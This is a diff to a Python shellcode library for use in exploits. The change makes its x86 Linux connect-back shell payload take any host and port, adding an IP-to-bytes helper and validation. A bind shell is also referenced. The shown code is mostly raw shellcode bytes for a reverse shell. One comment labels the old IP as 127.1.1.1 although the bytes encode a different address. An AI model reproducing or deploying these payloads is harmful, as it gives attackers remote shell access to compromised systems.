@@ -1,6 +1,13 @@
 #!/usr/bin/python
-
+from struct import *
 # a collection of shellcode use regulary on exploit code.
+
+def stoh(host):
+	byte_s = ''
+	if host.count('.') == 3:
+		for p in host.split('.'):
+			byte_s += chr(int(p))
+	return byte_s
 
 class x86:
 	def dupsSock(self):
@@ -27,10 +34,16 @@ class x86:
 		return bind_shell
 
 	def backconnectShell(self,host,port):
+		if stoh(host) == '':
+			raise Exception('Invalid Host')
+
+		if not isinstance(port,int):
+			raise Exception('Invalid Port')
+
 		connect_back = "\x68"
-		connect_back+= "\xc0\xf1\xb1\xad"  #// <- IP Number "127.1.1.1"
+		connect_back+= stoh(host) #// <- IP Number "127.1.1.1"
 		connect_back+= "\x5e\x66\x68"
-		connect_back+= "\x1f\x91"          #// <- Port Number "55555"
+		connect_back+= pack('>I',port)[2:]   #// <- Port Number "55555"
 		connect_back+= "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
 		connect_back+= "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
 		connect_back+= "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
